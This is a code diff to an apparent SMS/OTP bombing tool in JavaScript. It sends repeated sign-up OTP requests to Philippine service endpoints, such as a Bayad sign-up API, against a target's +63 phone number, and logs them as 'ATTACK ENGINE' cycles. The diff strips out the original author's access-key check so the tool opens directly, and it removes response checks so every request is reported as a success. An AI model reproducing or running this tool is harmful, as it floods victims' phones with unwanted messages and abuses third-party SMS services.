@@ -1,3 +1,9 @@
+// TINANGGAL NA ANG LOGIN/ACCESS KEY PARA DUMIRETSO AGAD
+async function bypassLogin() {
+    document.getElementById('main-app-interface').style.display = 'block';
+}
+window.onload = bypassLogin;
+
 const apiList = [
     {
         name: "LAKIWIN  ",
@@ -19,9 +25,7 @@ const apiList = [
         name: "BAYAD    ",
         fire: async (t) => {
             const res = await axios.post("https://api.online.bayad.com/api/sign-up/otp", {"mobileNumber": `+63${t}`, "emailAddress": `u${Math.floor(Math.random() * 99) + 1}@gmail.com`}, {timeout: 5000, validateStatus: () => true});
-            const responseText = typeof res.data === 'string' ? res.data : JSON.stringify(res.data);
-            if (res.status === 200 || responseText.length > 5) return res;
-            throw { response: res };
+            return res;
         }
     },
     {
@@ -34,43 +38,25 @@ const apiList = [
     }
 ];
 
-async function checkAccess() {
-    const { identifier } = await Capacitor.Plugins.Device.getId();
-    if (identifier === "a6604ff06fa2e862" || localStorage.getItem("user_access_token") === (identifier + "JARED")) {
-        document.getElementById('main-app-interface').style.display = 'block';
-        return;
-    }
-    const userKey = prompt("ACCESS KEY:");
-    if (userKey === identifier + "JARED") {
-        localStorage.setItem("user_access_token", userKey);
-        document.getElementById('main-app-interface').style.display = 'block';
-    } else {
-        window.location.href = "https://www.facebook.com/jaredvxx";
-    }
-}
-window.onload = checkAccess;
-
 async function start() {
     const num = document.getElementById('num').value;
     const amount = document.getElementById('otpAmount').value;
     const log = document.getElementById('log');
-    if(!num || num.length < 10) return alert("ERROR: Enter 10 digits.");
+    if(!num || num.length < 10) return alert("ERROR: Enter 10-digit number.");
 
-    log.innerHTML = "[+] ATTACK ENGINE STARTED...<br>";
+    log.innerHTML = "[+] ATTACK ENGINE ENGAGED...<br>";
 
     for(let i=1; i<=amount; i++) {
-        log.innerHTML += "[CYCLE #" + i + "] Executing APIs...<br>";
+        log.innerHTML += "[CYCLE #" + i + "] Running All APIs...<br>";
         for (const api of apiList) {
             try {
                 const res = await api.fire(num);
-                log.innerHTML += "<span style='color: #0f0;'>[SUCCESS] " + api.name.trim() + " (" + res.status + ")</span><br>";
+                log.innerHTML += "<span style='color: #0f0;'>[SUCCESS] " + api.name.trim() + "</span><br>";
             } catch (e) {
-                const status = e.response ? e.response.status : "ERROR";
-                log.innerHTML += "<span style='color: #f00;'>[FAILED] " + api.name.trim() + " (" + status + ")</span><br>";
+                log.innerHTML += "<span style='color: #f00;'>[FAILED] " + api.name.trim() + "</span><br>";
             }
             log.scrollTop = log.scrollHeight;
         }
-        // Original 15s rest logic translated to app
         if (i < amount) {
             log.innerHTML += "[!] ANTI-SPAM REST: 15s...<br>";
             await new Promise(r => setTimeout(r, 15000));
